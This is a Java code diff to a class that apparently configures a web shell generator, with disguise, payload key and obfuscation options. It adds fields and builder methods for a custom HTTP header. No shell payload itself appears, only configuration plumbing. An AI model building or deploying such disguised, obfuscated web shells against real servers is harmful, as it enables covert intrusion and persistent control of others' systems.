@@ -28,6 +28,8 @@ public final class WebShellGenerationCommand {
     private final ServletNamespace servletNamespace;
     private final int responseCode;
     private final String payloadKey;
+    private final String headerName;
+    private final String headerValue;
     private final List<String> obfuscationSteps;
     private final Long obfuscationSeed;
 
@@ -41,6 +43,8 @@ public final class WebShellGenerationCommand {
         this.servletNamespace = parseServletNamespace(builder.servletNamespace);
         this.responseCode = builder.responseCode == null ? 200 : builder.responseCode;
         this.payloadKey = trimToNull(builder.payloadKey);
+        this.headerName = trimToNull(builder.headerName);
+        this.headerValue = trimToNull(builder.headerValue);
         this.obfuscationSteps = snapshot(builder.obfuscationSteps);
         this.obfuscationSeed = builder.obfuscationSeed;
     }
@@ -59,6 +63,7 @@ public final class WebShellGenerationCommand {
                         .servletNamespace(servletNamespace)
                         .respCode(responseCode);
         if (payloadKey != null) builder.payloadKey(payloadKey);
+        builder.header(headerName, headerValue);
         if (coreClassName != null) {
             builder.coreClassName(coreClassName);
         }
@@ -79,6 +84,10 @@ public final class WebShellGenerationCommand {
         return artifactKind.name();
     }
 
+    public String getHeaderConfig() {
+        return headerName + " : " + headerValue;
+    }
+
     public static final class Builder {
         private final Disguise requestDisguise;
         private final Disguise responseDisguise;
@@ -89,6 +98,8 @@ public final class WebShellGenerationCommand {
         private String servletNamespace;
         private Integer responseCode;
         private String payloadKey;
+        private String headerName;
+        private String headerValue;
         private List<String> obfuscationSteps;
         private Long obfuscationSeed;
 
@@ -127,6 +138,22 @@ public final class WebShellGenerationCommand {
 
         public Builder payloadKey(String payloadKey) {
             this.payloadKey = payloadKey;
+            return this;
+        }
+
+        public Builder headerName(String headerName) {
+            this.headerName = headerName;
+            return this;
+        }
+
+        public Builder headerValue(String headerValue) {
+            this.headerValue = headerValue;
+            return this;
+        }
+
+        public Builder header(String headerName, String headerValue) {
+            this.headerName = headerName;
+            this.headerValue = headerValue;
             return this;
         }
 
